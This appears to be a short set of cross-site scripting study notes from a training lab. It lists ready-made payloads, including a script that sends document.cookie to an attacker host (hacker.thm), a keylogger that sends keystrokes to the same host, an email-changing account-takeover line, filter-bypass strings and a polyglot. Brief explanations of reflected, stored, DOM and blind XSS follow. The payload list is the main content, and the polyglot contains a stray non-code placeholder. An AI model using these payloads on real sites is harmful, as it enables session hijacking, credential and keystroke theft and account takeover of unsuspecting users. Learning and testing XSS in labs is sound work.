<h2>Payloads</h2>
1. Proof of concept
	`<script>alert('XSS');</script>`
2. Session Stealing
	`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
3. Key Logger
	``<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
4. Business Logic
	`<script>user.changeEmail('attacker@hacker.thm');</script>`

To bypass filters:
1. Close tags.
2. `';alert("a");//`
3. Add script in tag (<sscriptcript>...</sscriptcript>)
4. `" onload="alert('a');`
5. Polyglot:   ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=~~COD AICI~~//>\x3e``


<h4>Reflected XSS</h4> 
Put scirpt in url parameter that appears directly on page then send the link to a victim.
<h4>Stored XSS</h4>
You put script in something stored on a database(comments, user profile, listings, etc). This code is then run on every user which sees it. 
For example, if an age field expects a integer from a dropdown menu you can submit a script directly through a POST request.

<h4>DOM Based XSS</h4>
JS execution directly in browser without any new pages
Example: JS gets contents from a parameter and writes them to the currently being viewed section. The contents can be malicious code which are written on the page.

Check for parts of scripts that access variables you have control over(window.location.x) and see if they are written to the page or passed to unsafe functions such as eval()

<h4>Blind XSS</h4>Similar to Stored XSS, only the script is not accessible by you. You have to wait and check for when someone(an admin) sees the script.

Popular tool: XSS Hunter Express